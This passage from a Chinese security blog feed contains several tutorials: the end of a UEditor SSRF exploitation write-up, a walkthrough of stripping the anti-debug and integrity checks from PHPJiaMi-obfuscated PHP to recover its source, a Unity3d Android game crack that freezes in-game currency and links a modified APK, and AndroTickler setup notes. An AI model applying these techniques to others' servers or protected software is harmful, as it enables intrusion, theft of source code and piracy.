<p>这里需要抓取的图片地址为：<a href="http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png" target="_blank" rel="noopener">http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png</a></p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/13.png" alt="1527181487872"></p>
<p>由上图可以看出，最后抓取的文件保存地址为：<code>/ueditor/jsp/upload/image/20180525/1527181480175039672.png</code></p>
<h3 id="查看结果"><a href="#查看结果" class="headerlink" title="查看结果"></a>查看结果</h3><p>然后访问<a href="http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png" target="_blank" rel="noopener">http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png</a></p>
<p>查看是否攻击成功。</p>
<p><img src="/2018/05/25/UEditor-SSRF-In-JSP/14.png" alt="1527181545625"></p>
<p>表明攻击成功。</p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如<code>/jmx-console/images/logo.gif</code>, <code>/tomcat.png）</code>，判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。</p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Ueditor </tag>
            
            <tag> SSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[某PHP加密文件解密过程初探]]></title>
      <url>/2018/02/08/Free-PhpJiaMi-Decrypt/</url>
      <content type="html"><![CDATA[<p>最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。<br><a id="more"></a></p>
<h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。<br>安装php debug插件比较简单，直接快捷键ctrl + shift + x  或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/01.jpg" alt="01"><br>然后安装即可。<br>其次是安装XDebug。安装可以参考:<a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">https://xdebug.org/docs/install</a> 。首先查看一下PHP版本。我这里用的是5.5.30。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/02.jpg" alt="02"><br>打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/03.jpg" alt="03"><br>打开扩展。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/04.png" alt="04"><br>注意设置<code>xdebug.remote_autostart = 1</code>。这样设置好debug和断点后，浏览器运行即可自动命中断点。<br>打开VSCode，设置编辑php的可执行文件路径。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/05.jpg" alt="05"><br>这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/06.jpg" alt="06"><br>给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/07.jpg" alt="07"><br>乱码的话可以通过更改文件编码来设置。快捷键<code>Ctrl + Shift + P</code>，选择更改文件编码，找到合适的编码。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/08.jpg" alt="08"><br>php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_execution_time = <span class="number">300</span></span><br></pre></td></tr></table></figure></p>
<h1 id="0x02-解密"><a href="#0x02-解密" class="headerlink" title="0x02 解密"></a>0x02 解密</h1><h4 id="1-独立加密"><a href="#1-独立加密" class="headerlink" title="1.独立加密"></a>1.独立加密</h4><p>上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/09.jpg" alt="09"><br>加密后大概是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span>error_reporting(<span class="number">0</span>);ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);<span class="keyword">if</span>(!defined(<span class="string">'kcapwkef'</span>))&#123;define(<span class="string">'kcapwkef'</span>,<span class="keyword">__FILE__</span>);<span class="keyword">if</span>(!function_exists(<span class="string">"�㒁�؁��"</span>))&#123;<span class="function"><span class="keyword">function</span> �����ٹ�<span class="params">($������)</span></span>&#123;<span class="keyword">global</span>$Đ���Л�,$�……</span><br></pre></td></tr></table></figure>
<p>使用PHP-Parser对代码进行格式化，便于调试。<br>执行命令<code>composer require nikic/php-parser</code><br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/10.jpg" alt="10"><br>利用作者的format.php将代码格式化。代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">$code = file_get_contents(<span class="string">'9014/t.php'</span>);</span><br><span class="line">$parser = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $ast = $parser-&gt;parse($code);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Error $error) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Parse error: &#123;$error-&gt;getMessage()&#125;\n"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$prettyPrinter = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line">$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);</span><br><span class="line">file_put_contents(<span class="string">'9014/t2.php'</span>, $prettyCode);</span><br></pre></td></tr></table></figure>
<p>然后执行命令<code>php format.php</code>，会生成格式化的t2.php。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/11.jpg" alt="11"><br>选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是<code>Western (ISO 8859-1)</code>。<br>我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。<br>F10运行时发现在102行退出了程序。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/12.jpg" alt="12"><br>然后在第102行下断点，F11单步运行。进入后继续F10运行。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/13.jpg" alt="13"><br>当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字<code>decode_func</code>）。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/14.jpg" alt="14"><br>直接在73行返回值处下断点，然后F5运行，看返回的结果。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/15.jpg" alt="15"><br>同理，查看第15行返回的结果。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/16.jpg" alt="16"><br>那么第23行处的代码为：<br><code>php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;</code><br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/17.jpg" alt="17"><br>由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/18.jpg" alt="18"><br>此处代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'SERVER_ADDR'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>])) &#123; </span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由控制台发现<br><code>!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])</code><br>执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/19.jpg" alt="19"><br>第28-32行对应代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$t = microtime(<span class="keyword">true</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (microtime(<span class="keyword">true</span>) * <span class="number">1000</span> - $t &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处判断执行时间大于100毫秒就退出，当然还是注释即可。<br>运行至第34行，程序退出。F11进入。调用了第52行的<code>decode_func</code>函数。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/20.jpg" alt="20"><br>直接查看返回值。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/21.jpg" alt="21"><br>第34行对应的代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure></p>
<p><code>decode_func</code>是第52行的函数，$f是当前的文件，<code>$undefined1</code>和 <code>$undefined2</code>都不存在。查看<code>strpos</code>中两个参数。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/22.jpg" alt="22"><br>那么 <code>! strops(string,find)</code> 的结果为true。则执行<code>$undefined1()</code>，这个方法不存在，就会Error并退出程序。如下图所示。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/23.jpg" alt="23"><br>解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 <code>$undefined2</code>，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。<br>然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。<br>运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/24.jpg" alt="24"><br>可以通过file_put_contents将文件保存即可。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/25.jpg" alt="25"><br>查看输出的结果。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/26.jpg" alt="26"><br>也可以在第102行用file_put_contents将文件保存。<br>使用原作者的decrypt.php也可解密。执行命令：<code>php decrypt.php 9014\t.php</code>，会生成解密后的文件”t.php.decrypted.php”。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/27.jpg" alt="27"></p>
<h4 id="2-LIB库加密"><a href="#2-LIB库加密" class="headerlink" title="2._LIB库加密"></a>2._LIB库加密</h4><p>调试过程和独立加密类似。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/28.jpg" alt="28"><br>还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/29.jpg" alt="29"><br>这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。<br>然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/30.jpg" alt="30"><br>运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/31.jpg" alt="31"><br>运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。<br>执行的代码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$f = file_get_contents(<span class="string">'_lib.php'</span>);</span><br><span class="line">!strpos(decode_func(substr($f, <span class="number">-45</span>, <span class="number">-1</span>)), md5(substr($f, <span class="number">0</span>, <span class="number">-46</span>))) ? $undefined1() : $undefined2;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/32.jpg" alt="32"><br>注释该校验即可。<br>继续执行，查看返回即可看到加密前的代码了。<br><img src="/2018/02/08/Free-PhpJiaMi-Decrypt/33.jpg" alt="33"></p>
<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。</p>
<p>这里都是以免费加密为例，关于VIP加密的可以参考作者的文章<a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">【原创】某PHP加密文件调试解密过程</a> ，还有他的虚拟机加密解密的文章也值得学习。</p>
<p><a href="https://fuping.site/files/ctf.7z">所用的代码</a></p>
<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://www.52pojie.cn/thread-693641-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-693641-1-1.html</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之美 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP解密 </tag>
            
            <tag> PHP调试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Unity3d类安卓游戏逆向分析初探]]></title>
      <url>/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/</url>
      <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。<br>这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。<br><a id="more"></a></p>
<h3 id="0x02-修改数据"><a href="#0x02-修改数据" class="headerlink" title="0x02 修改数据"></a>0x02 修改数据</h3><p>下载app后重命名为zip文件，发现存在assets\bin\Data\Managed目录，那么该游戏应该为Unity游戏。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/1.jpg" alt="查看apk文件"><br>那么需要分析的文件就是就是Assembly-CSharp.dll。</p>
<p>首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/2.jpg" alt="抽奖券不足"></p>
<p>使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/3.jpg" alt="搜索字符串"><br>由此可以猜测TicketStock代表抽奖券库存。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/4.jpg" alt="抽奖券库存"><br>ticket表示抽奖券数量。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/5.jpg" alt="抽奖券数量"><br>当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/6.jpg" alt="初始化方法"><br>快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/7.jpg" alt="编辑IL指令"><br>确定后，发现ticket数值已经改变。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/8.jpg" alt="抽奖券修改"><br>重新打包APP后，进行安装。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/9.png" alt="抽奖券改变"><br>打开抽奖界面发现数量已经改变为1000。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/10.png" alt="抽奖后抽奖券变动"><br>这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SuperGameMaster.TicketStock() &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ConfilmPanel confilm = <span class="keyword">this</span>.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;();</span><br><span class="line">    confilm.OpenPanel(<span class="string">"ふくびき券が足りません"</span>);</span><br><span class="line">    confilm.ResetOnClick_Screen();</span><br><span class="line">    confilm.SetOnClick_Screen(delegate</span><br><span class="line">    &#123;</span><br><span class="line">        confilm.ClosePanel();</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/11.jpg" alt="TicketStock方法"><br>右键编辑IL指令。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/12.jpg" alt="编辑IL指令"><br>将其值修改为9000.<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/13.jpg" alt="修改返回值"><br>然后保存后打包并重新安装。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/14.png" alt="打包安装"><br>此时无论抽多少次，奖券都不再变化。<br>另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/15.jpg" alt="修改三叶草"><br>将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/16.png" alt="三叶草数量"></p>
<h3 id="0x03-汉化"><a href="#0x03-汉化" class="headerlink" title="0x03 汉化"></a>0x03 汉化</h3><p>然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/17.jpg" alt="查找文字"><br>然后修改为对应的中文就行了。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/18.jpg" alt="日文修改为对应的中文"><br>进入游戏查看。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/19.png" alt="文字替换成功"><br>修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。</p>
<h3 id="0x04-其他修改"><a href="#0x04-其他修改" class="headerlink" title="0x04 其他修改"></a>0x04 其他修改</h3><p>按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。<br>首先需要在AndroidManifest.xml文件中增加<code>android:allowBackup=&quot;true&quot;</code>。<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/20.jpg" alt="修改AndroidManifest.xml文件"><br>这样就可以使用备份命令了。<br>命令如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb backup -nosystem -noshared -noapk <span class="_">-f</span> jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru</span><br><span class="line">//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 <span class="_">-f</span> 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/23.jpg" alt="备份和恢复"><br>手机备份操作界面：<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/21.png" alt="备份数据"></p>
<p>恢复命令比较简单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore jp.co.hit_point.tabikaeru.ab</span><br></pre></td></tr></table></figure></p>
<p>手机备份还原界面<br><img src="/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/22.png" alt="恢复数据"></p>
<p>然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。</p>
<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。<br><a href="https://fuping.site/files/jp.co.hit_point.tabikaeru.apk">原版APK</a><br><a href="https://fuping.site/files/tabikaeru.apk">修改后的APK</a>（修改了抽奖券、三叶草和部分汉化）</p>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p>[1]<a href="https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d" target="_blank" rel="noopener">https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d</a><br>[2] <a href="https://www.52pojie.cn/thread-647612-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-647612-1-1.html</a></p>
]]></content>
      
        <categories>
            
            <category> 移动安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Unity3d </tag>
            
            <tag> 青蛙旅行 </tag>
            
            <tag> 逆向分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安卓渗透利器AndroTickler使用排雷指北]]></title>
      <url>/2018/01/03/How-To-Use-AndroTickler/</url>
      <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考<a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">https://github.com/ernw/AndroTickler</a> 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。</p>
<p>本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。</p>
<p>主要包括以下几个方面。</p>
<ol>
<li>编译环境的准备</li>
<li>使用过程中遇到的问题以及解决方法</li>
</ol>
<a id="more"></a>
<h1 id="0x02-编译环境的准备"><a href="#0x02-编译环境的准备" class="headerlink" title="0x02 编译环境的准备"></a>0x02 编译环境的准备</h1><h2 id="1-Gradle的安装"><a href="#1-Gradle的安装" class="headerlink" title="1. Gradle的安装"></a>1. Gradle的安装</h2><p>首先需要安装Java，我采用的是Java8（安装工具说明，需要Java7以上）。下载地址：<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a> 。（安装过程省略）</p>
<p>关于gradle的安装可以参考<a href="https://gradle.org/install/" target="_blank" rel="noopener">https://gradle.org/install/</a> ，我这里是直接下载安装包<a href="https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，" target="_blank" rel="noopener">https://services.gradle.org/distributions/gradle-4.4.1-bin.zip，</a> 解压之后添加环境变量。<br><img src="/2018/01/03/How-To-Use-AndroTickler/gradle安装.jpg" alt="gradle安装"></p>
<h2 id="2-cmder工具安装"><a href="#2-cmder工具安装" class="headerlink" title="2. cmder工具安装"></a>2. cmder工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://github.com/cmderdev/cmder/releases/" target="_blank" rel="noopener">https://github.com/cmderdev/cmder/releases/</a><br>解压添加环境变量即可使用。<br><img src="/2018/01/03/How-To-Use-AndroTickler/cmder工具.jpg" alt="cmder工具"></p>
<blockquote>
<p>使用该工具除了界面好看外，可以多个tab，也可以运行部分linux命令。当然也可以使用其他工具，如cygwin。如果没有使用这类工具的话，需要将代码中一些命令修改，如<code>cp</code>命令。</p>
</blockquote>
<h2 id="3-Git工具安装"><a href="#3-Git工具安装" class="headerlink" title="3. Git工具安装"></a>3. Git工具安装</h2><p>该步骤非必需，可以省略。<br>下载地址：<a href="https://desktop.github.com/" target="_blank" rel="noopener">https://desktop.github.com/</a><br>安装即可。然后下载 <a href="https://github.com/ernw/AndroTickler" target="_blank" rel="noopener">AndroTickler</a><br><img src="/2018/01/03/How-To-Use-AndroTickler/下载.jpg" alt="下载"></p>
<h2 id="4-其他工具安装"><a href="#4-其他工具安装" class="headerlink" title="4.其他工具安装"></a>4.其他工具安装</h2><p>还需要安装adb, sqlite3, strings等工具。<br>adb的话安装夜神模拟器的时候自动，名字为nox_adb，功能一样。<br>sqlite3可以用<a href="https://www.sqlite.org/" target="_blank" rel="noopener">https://www.sqlite.org/</a> 下载。<br>strings的官网，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sysinternals/downloads/strings</a> ，下载地址为：<br><a href="https://download.sysinternals.com/files/Strings.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/Strings.zip</a> 。解压后加入环境变量即可。</p>
<p>然后就是开始编译和使（入）用（坑）了。</p>
<h1 id="0x03-使用过程中遇到的问题以及解决方法"><a href="#0x03-使用过程中遇到的问题以及解决方法" class="headerlink" title="0x03 使用过程中遇到的问题以及解决方法"></a>0x03 使用过程中遇到的问题以及解决方法</h1><p>上面环境已经搭建好了，代码也下载了，然后就开始入坑吧。<br>编译的话很简单，使用命令<code>gradle &amp;&amp; gradle build</code>即可。<br><img src="/2018/01/03/How-To-Use-AndroTickler/编译.jpg" alt="编译"><br>然后会在build\libs目录下生成AndroTickler.jar文件。</p>
<p>软件生成了，那么看看有什么功能吧，使用命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -h</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/使用帮助.jpg" alt="使用帮助"></p>
<p>貌似一切正常。下面开始查看安装的app。</p>
<p>使用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar AndroTickler.jar -pkgs</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/01/03/How-To-Use-AndroTickler/查看安装的app1.jpg" alt="查看安装的app1"></p>
